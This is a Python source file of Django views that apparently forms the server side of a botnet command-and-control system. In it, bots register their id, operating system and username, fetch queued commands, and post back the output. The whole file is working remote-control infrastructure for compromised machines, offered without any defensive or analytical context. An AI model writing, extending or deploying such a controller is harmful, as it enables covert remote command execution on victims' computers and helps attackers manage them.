from django.utils.decorators import method_decorator
from django.views import View
from django.http import HttpResponse, JsonResponse
from django.utils import timezone
from bots.auth import bot_authentication
from bots.models import Bot, Task


class AuthView(View):

    def post(self, request):
        uid = request.POST.get("uid")
        os = request.POST.get("os")
        username = request.POST.get("user")

        if not (uid and os and username):
            return HttpResponse(status=400)

        Bot.objects.create(uuid=uid, os=os, username=username, last_connection=timezone.now())
        return HttpResponse(status=204)


class TaskView(View):

    @method_decorator(bot_authentication)
    def get(self, request):
        task = Task.objects.filter(bot=request.bot).first()

        if not task:
            return JsonResponse({}, status=200)

        return JsonResponse({"task_id": task.pk, "command": task.command}, status=200)


class DeliveryView(View):

    @method_decorator(bot_authentication)
    def post(self, request):
        task_id = request.POST.get("task_id")
        answer = request.POST.get("answer")

        if not (task_id and answer):
            return HttpResponse(status=400)

        task = Task.objects.filter(pk=task_id).first()
        if (not task) or (task.bot != request.bot):
            return HttpResponse(status=403)

        task.answer = answer
        task.save()
        return HttpResponse(status=204)
